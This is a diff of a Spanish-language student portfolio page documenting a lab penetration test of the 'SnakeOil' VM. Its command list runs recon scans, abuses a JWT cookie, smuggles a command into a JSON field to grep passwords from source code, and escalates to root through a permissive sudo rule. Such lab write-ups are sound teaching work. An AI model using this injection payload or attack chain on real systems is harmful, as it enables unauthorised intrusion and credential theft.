@@ -1,108 +1,137 @@
-<section class="hextech-panel project-details" id="snakeoil-pentest">
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auditoría SnakeOil - Seguridad Informática</title>
+    <!-- Favicon de la página -->
+    <link rel="icon" type="image/jpeg" href="favicon.jpg">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
     
-    <!-- Barra de navegación para regresar -->
-    <div class="project-navigation" style="margin-bottom: 20px;">
-        <a href="index.html" class="cyber-button back-btn">
-            &larr; Volver al inicio
-        </a>
-    </div>
+    <!-- FONDO ANIMADO DE CRISTALES HEXTECH -->
+    <ul class="bubbles">
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+        <li></li>
+    </ul>
 
-    <!-- Encabezado del Proyecto -->
-    <header class="project-header">
-        <h2 class="gold-accent">Auditoría de Seguridad: Servidor SnakeOil</h2>
-        <p class="subtitle">Explotación de vulnerabilidades lógicas, evasión de filtros y escalada de privilegios en entorno Linux.</p>
-    </header>
-
-    <!-- 6. Descarga del Informe -->
-    <div class="project-actions">
-        <!-- CORRECCIÓN: Se quitó "assets/docs/" porque el PDF está en la misma carpeta -->
-        <a href="Reporte_Tecnico_SnakeOil.pdf" download="Reporte_Tecnico_SnakeOil.pdf" class="cyber-button download-btn" target="_blank">
-            Descargar Informe Técnico Completo (PDF)
-        </a>
-    </div>
-
-    <!-- 1. Introducción -->
-    <article class="project-section introduction">
-        <h3 class="section-title">Introducción</h3>
-        <p>
-            Este proyecto documenta un ejercicio completo de pruebas de penetración (pentesting) sobre un servidor vulnerable configurado en un entorno de laboratorio aislado (VirtualBox). El objetivo principal fue mapear la superficie de ataque, evadir los mecanismos de defensa de la aplicación web y obtener acceso administrativo total (root). La auditoría demuestra cómo las malas configuraciones lógicas y de permisos superan a menudo a la criptografía robusta, requiriendo un enfoque analítico para pivotar entre diferentes vectores de ataque.
-        </p>
-    </article>
-
-    <!-- 2. Recursos Utilizados -->
-    <article class="project-section resources">
-        <h3 class="section-title">Recursos Tecnológicos</h3>
-        <ul class="hex-list">
-            <li><strong>Entorno de virtualización:</strong> Oracle VirtualBox (Red NAT aislada).</li>
-            <li><strong>Máquina atacante:</strong> Kali Linux (ajustada a 4GB de RAM para cargas criptográficas).</li>
-            <li><strong>Máquina objetivo:</strong> Imagen "SnakeOil" (Basada en Debian).</li>
-            <li><strong>Herramientas clave:</strong> arp-scan, Nmap, Gobuster, cURL, SSH.</li>
-        </ul>
-    </article>
-
-    <!-- 3. Lista de Comandos Clave (The Golden Path) -->
-    <article class="project-section command-list">
-        <h3 class="section-title">Metodología y Comandos Ejecutados</h3>
-        <p>A continuación se detalla la ruta crítica de explotación que llevó al compromiso del sistema, omitiendo los callejones sin salida para centrarse en los vectores efectivos.</p>
-
-        <div class="terminal-box">
-            <div class="terminal-header">
-                <span class="dot red"></span>
-                <span class="dot yellow"></span>
-                <span class="dot green"></span>
-                <span class="terminal-title">kali@atacante:~</span>
-            </div>
-            <div class="terminal-body">
-                <h4 class="phase-title">Fase 1: Reconocimiento</h4>
-                <p class="cmd-desc">// Descubrir la IP de la máquina víctima (10.0.2.15) dentro de la red usando ARP.</p>
-                <code><span class="prompt">$</span> sudo arp-scan -I eth0 --localnet</code>
-                
-                <p class="cmd-desc">// Escaneo sigiloso y rápido de los 65,535 puertos.</p>
-                <code><span class="prompt">$</span> sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.0.2.15</code>
-
-                <h4 class="phase-title">Fase 2: Interacción con la API (Acceso Inicial)</h4>
-                <p class="cmd-desc">// Registro de usuario válido mediante API para capturar un JWT fresco.</p>
-                <code><span class="prompt">$</span> curl -i -X POST -d "username=hacker2" -d "password=hacker123" http://10.0.2.15:8080/registration</code>
-
-                <p class="cmd-desc">// Bypass de autenticación inyectando el token como cookie para obtener la llave secreta.</p>
-                <code><span class="prompt">$</span> curl -i http://10.0.2.15:8080/secret --cookie "access_token_cookie=TU_TOKEN"</code>
-
-                <h4 class="phase-title">Fase 3: Evasión y Ejecución Remota de Comandos (RCE)</h4>
-                <p class="cmd-desc">// SSRF para inyectar comandos bash y extraer credenciales evadiendo filtros.</p>
-                <code><span class="prompt">$</span> curl -s -X POST http://10.0.2.15:8080/run -H 'Content-Type: application/json' -d '{"secret_key":"commandexecutionissecret","url":"$(grep -i passw /home/patrick/flask_blog/app.py)"}'</code>
-
-                <h4 class="phase-title">Fase 4: Escalada a Root</h4>
-                <p class="cmd-desc">// Conexión persistente evadiendo la aplicación web.</p>
-                <code><span class="prompt">$</span> ssh patrick@10.0.2.15</code>
-
-                <p class="cmd-desc">// Enumeración de privilegios locales (reveló vulnerabilidad (ALL : ALL) ALL).</p>
-                <code><span class="prompt">$</span> sudo -l</code>
-
-                <p class="cmd-desc">// Ejecución de shell como superusuario y obtención de bandera.</p>
-                <code><span class="prompt">$</span> sudo su</code>
-            </div>
+    <main>
+        <!-- Botón para regresar al inicio -->
+        <div style="margin-bottom: 20px;">
+            <a href="index.html" class="back-link">← Volver al inicio</a>
         </div>
-    </article>
 
-    <!-- 4. Video Explicativo -->
-    <article class="project-section video-container">
-        <h3 class="section-title">Video Explicativo</h3>
-        <p>En el siguiente video detallo el proceso interactivo de la intrusión y la explicación de las vulnerabilidades lógicas explotadas.</p>
-        <div class="media-wrapper">
-            <!-- CORRECCIÓN: Se quitó "assets/videos/" porque el video está en la misma carpeta -->
-            <video controls class="cyber-video" preload="metadata">
-                <source src="videotutorial.mp4" type="video/mp4">
-                Tu navegador no soporta la reproducción de videos.
-            </video>
+        <div class="parcial-header">
+            <h1 class="hex-title">Auditoría de Seguridad: Servidor SnakeOil</h1>
+            <p class="hex-subtitle">"Explotación de vulnerabilidades lógicas, evasión de filtros y escalada de privilegios en entorno Linux"</p>
         </div>
-    </article>
 
-    <!-- 5. Conclusión -->
-    <article class="project-section conclusion">
-        <h3 class="section-title">Conclusión</h3>
-        <p>
-            Este ejercicio evidenció que la seguridad de un sistema no depende únicamente de la robustez de sus algoritmos criptográficos, sino de la correcta implementación de su arquitectura lógica. La intrusión se logró encadenando vulnerabilidades sutiles: el transporte inseguro de un JWT, un SSRF que permitió ejecución de comandos, y finalmente, una violación al principio de menor privilegio en el sistema operativo. La capacidad de adaptar la estrategia ofensiva —pasando de la fuerza bruta a la extracción quirúrgica de código fuente— fue determinante para comprometer exitosamente el objetivo.
-        </p>
-    </article>
+        <!-- BOTÓN DE DESCARGA PDF -->
+        <div style="text-align: center; margin-bottom: 40px;">
+            <!-- Nota: La ruta es directa porque están en la misma carpeta -->
+            <a href="Reporte_Tecnico_SnakeOil.pdf" download class="btn-hextech">
+                <span class="gold-accent">↓</span> Descargar Informe Técnico Completo (PDF)
+            </a>
+        </div>
 
-</section>
+        <!-- 1. Introducción -->
+        <section>
+            <h2>Introducción</h2>
+            <p>
+                Este proyecto documenta un ejercicio completo de pruebas de penetración (pentesting) sobre un servidor vulnerable configurado en un entorno de laboratorio aislado (VirtualBox). El objetivo principal fue mapear la superficie de ataque, evadir los mecanismos de defensa de la aplicación web y obtener acceso administrativo total (root). La auditoría demuestra cómo las malas configuraciones lógicas y de permisos superan a menudo a la criptografía robusta, requiriendo un enfoque analítico para pivotar entre diferentes vectores de ataque.
+            </p>
+        </section>
+
+        <!-- 2. Recursos Utilizados -->
+        <section>
+            <h2>Recursos Tecnológicos</h2>
+            <ul class="hex-list">
+                <li><strong>Entorno de virtualización:</strong> Oracle VirtualBox (Red NAT aislada).</li>
+                <li><strong>Máquina atacante:</strong> Kali Linux (ajustada a 4GB de RAM para cargas criptográficas).</li>
+                <li><strong>Máquina objetivo:</strong> Imagen "SnakeOil" (Basada en Debian).</li>
+                <li><strong>Herramientas clave:</strong> arp-scan, Nmap, Gobuster, cURL, SSH.</li>
+            </ul>
+        </section>
+
+        <!-- 3. Lista de Comandos Clave (The Golden Path) -->
+        <section>
+            <h2>Metodología y Comandos Ejecutados</h2>
+            <p>A continuación se detalla la ruta crítica de explotación que llevó al compromiso del sistema, omitiendo los callejones sin salida para centrarse en los vectores efectivos.</p>
+
+            <div class="terminal-box">
+                <div class="terminal-header">
+                    <span class="dot red"></span>
+                    <span class="dot yellow"></span>
+                    <span class="dot green"></span>
+                    <span class="terminal-title">kali@atacante:~</span>
+                </div>
+                <div class="terminal-body">
+                    <h4 class="phase-title">Fase 1: Reconocimiento</h4>
+                    <p class="cmd-desc">// Descubrir la IP de la máquina víctima (10.0.2.15) dentro de la red usando ARP.</p>
+                    <code><span class="prompt">$</span> sudo arp-scan -I eth0 --localnet</code>
+                    
+                    <p class="cmd-desc">// Escaneo sigiloso y rápido de los 65,535 puertos.</p>
+                    <code><span class="prompt">$</span> sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.0.2.15</code>
+
+                    <h4 class="phase-title">Fase 2: Interacción con la API (Acceso Inicial)</h4>
+                    <p class="cmd-desc">// Registro de usuario válido mediante API para capturar un JWT fresco.</p>
+                    <code><span class="prompt">$</span> curl -i -X POST -d "username=hacker2" -d "password=hacker123" http://10.0.2.15:8080/registration</code>
+
+                    <p class="cmd-desc">// Bypass de autenticación inyectando el token como cookie para obtener la llave secreta.</p>
+                    <code><span class="prompt">$</span> curl -i http://10.0.2.15:8080/secret --cookie "access_token_cookie=TU_TOKEN"</code>
+
+                    <h4 class="phase-title">Fase 3: Evasión y Ejecución Remota de Comandos (RCE)</h4>
+                    <p class="cmd-desc">// SSRF para inyectar comandos bash y extraer credenciales evadiendo filtros.</p>
+                    <code><span class="prompt">$</span> curl -s -X POST http://10.0.2.15:8080/run -H 'Content-Type: application/json' -d '{"secret_key":"commandexecutionissecret","url":"$(grep -i passw /home/patrick/flask_blog/app.py)"}'</code>
+
+                    <h4 class="phase-title">Fase 4: Escalada a Root</h4>
+                    <p class="cmd-desc">// Conexión persistente evadiendo la aplicación web.</p>
+                    <code><span class="prompt">$</span> ssh patrick@10.0.2.15</code>
+
+                    <p class="cmd-desc">// Enumeración de privilegios locales (reveló vulnerabilidad (ALL : ALL) ALL).</p>
+                    <code><span class="prompt">$</span> sudo -l</code>
+
+                    <p class="cmd-desc">// Ejecución de shell como superusuario y obtención de bandera.</p>
+                    <code><span class="prompt">$</span> sudo su</code>
+                </div>
+            </div>
+        </section>
+
+        <!-- 4. Video Explicativo -->
+        <section>
+            <h2>Video Explicativo</h2>
+            <p>En el siguiente video detallo el proceso interactivo de la intrusión y la explicación de las vulnerabilidades lógicas explotadas.</p>
+            <div class="media-wrapper">
+                <!-- Nota: La ruta del video es directa en la misma carpeta -->
+                <video controls class="cyber-video" preload="metadata">
+                    <source src="videotutorial.mp4" type="video/mp4">
+                    Tu navegador no soporta la reproducción de videos.
+                </video>
+            </div>
+        </section>
+
+        <!-- 5. Conclusión -->
+        <section>
+            <h2>Conclusión</h2>
+            <p>
+                Este ejercicio evidenció que la seguridad de un sistema no depende únicamente de la robustez de sus algoritmos criptográficos, sino de la correcta implementación de su arquitectura lógica. La intrusión se logró encadenando vulnerabilidades sutiles: el transporte inseguro de un JWT, un SSRF que permitió ejecución de comandos, y finalmente, una violación al principio de menor privilegio en el sistema operativo. La capacidad de adaptar la estrategia ofensiva —pasando de la fuerza bruta a la extracción quirúrgica de código fuente— fue determinante para comprometer exitosamente el objetivo.
+            </p>
+        </section>
+
+    </main>
+
+    <!-- PIE DE PÁGINA (FOOTER) -->
+    <footer>
+        <p>&copy; 2026 Erik Del Angel Arriaga Torres. Fundamentos de Ciberseguridad.</p>
+        <p>UPSLP</p>
+    </footer>
+
+</body>
+</html>
